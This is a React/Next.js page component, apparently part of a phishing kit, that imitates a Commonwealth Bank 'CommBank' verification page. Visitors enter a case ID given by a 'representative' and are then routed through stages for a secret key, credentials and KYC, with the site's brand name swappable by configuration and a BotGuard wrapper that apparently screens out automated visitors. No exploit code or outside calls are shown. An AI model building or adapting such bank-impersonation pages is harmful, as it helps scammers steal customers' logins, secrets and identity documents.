'use client';

/**
 * CBA Landing Page
 * 
 * Entry point for customer-initiated verification path
 * Two-column layout matching CommBank design patterns
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { currentBrand } from '@/config/branding';
import { useSessionStore } from '@shared';
import { Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';
import { Sidebar } from '@/components/layout/Sidebar';

// Arrow Icon SVG component
function ArrowIcon() {
  return (
    <svg className="arrow-icon" width="8" height="10" viewBox="0 0 8 10" fill="none" xmlns="http://www.w3.org/2000/svg">
      <polygon points="0,0 8,5 0,10" fill="#FFCC00" />
    </svg>
  );
}

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials';
        const guestToken = data.guestToken;

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <BotGuard>
      <div className="main-container">
        {/* Two Column Layout */}
        <section className="login-section">
          {/* Left Column - Case ID Form */}
          <div className="login-box">
            <div className="box-header">
              <span>Enter your Case ID</span>
            </div>
            <div className="box-content">
              <form className="login-form" onSubmit={handleSubmit}>
                <p className="form-description">
                  Enter the case ID provided by your {currentBrand.companyName} representative.
                </p>

                <div className="form-row" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '8px', marginBottom: '15px' }}>
                  <label htmlFor="case-id" className="form-label" style={{ width: 'auto', textAlign: 'left' }}>
                    Case ID
                  </label>
                  <input
                    type="text"
                    id="case-id"
                    name="case-id"
                    className="form-input"
                    style={{ width: '100%', maxWidth: '200px', height: '28px' }}
                    autoComplete="off"
                    value={caseId}
                    onChange={(e) => {
                      setCaseId(e.target.value);
                      if (fieldError) setFieldError('');
                    }}
                    disabled={isLoading}
                  />
                </div>

                {/* Error message - inline style */}
                {fieldError && (
                  <div className="error-message" style={{ marginBottom: '15px' }}>
                    <span>{fieldError}</span>
                  </div>
                )}

                {/* Continue Button */}
                <div className="form-row button-row" style={{ paddingLeft: 0 }}>
                  <button
                    type="submit"
                    className="logon-button"
                    disabled={isLoading}
                  >
                    {isLoading && <Loader2 className="h-4 w-4 animate-spin" />}
                    {isLoading ? 'Processing...' : 'Continue'}
                  </button>
                </div>
              </form>

              <div className="form-footer" style={{ paddingLeft: 0, marginTop: '20px' }}>
                <p style={{ fontSize: '11px', color: '#666' }}>
                  If you received a direct link from your representative, please use that link instead.
                </p>
              </div>
            </div>
          </div>

          {/* Right Column - Help Sidebar */}
          <Sidebar title="Need help?">
            <ul className="new-links">
              <li><a href="#">What is a case ID?</a></li>
              <li><a href="#">Contact {currentBrand.companyName} support</a></li>
              <li><a href="#">Tips to stay safe online</a></li>
            </ul>
          </Sidebar>
        </section>

        {/* Quicklinks Section */}
        <section className="quicklinks-section">
          <h3 className="quicklinks-title">Quicklinks</h3>
          <ul className="quicklinks-list">
            <li>
              <ArrowIcon />
              <a href="#">Are you experiencing financial difficulty? Get help</a>
            </li>
            <li>
              <ArrowIcon />
              <a href="#">Report suspicious activity or scams</a>
            </li>
          </ul>
        </section>
      </div>
    </BotGuard>
  );
}
